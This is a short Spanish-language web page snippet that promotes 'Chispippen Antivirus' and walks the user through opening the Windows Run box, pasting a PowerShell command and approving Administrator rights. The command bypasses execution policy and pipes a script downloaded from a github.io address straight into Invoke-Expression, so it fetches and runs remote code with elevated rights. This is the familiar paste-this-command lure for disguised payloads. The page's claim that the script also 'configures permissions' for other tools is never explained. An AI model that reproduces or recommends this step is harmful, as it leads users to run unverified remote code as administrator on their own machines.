⚡ Método 1 (Recomendado): Instalación Instantánea en 10 segundos

Instala Chispippen Antivirus en tu Escritorio y configura automáticamente los permisos para Antigravity, GitHub y Localhost:

  1. Paso 1: Haz clic en el botón verde de abajo para copiar el comando de instalación.
  2. Paso 2: En tu teclado, presiona las teclas Windows + R al mismo tiempo (se abrirá la ventana "Ejecutar").
  3. Paso 3: Pega el comando con Ctrl + V, presiona Enter y cuando Windows pida permiso de Administrador, elige "Sí".
powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://chispippen.github.io/centinela-antivirus/instalar.ps1 | iex"
✅ ¡Comando copiado! Ahora presiona Windows + R en tu teclado, pégalo (Ctrl + V) y dale Enter.
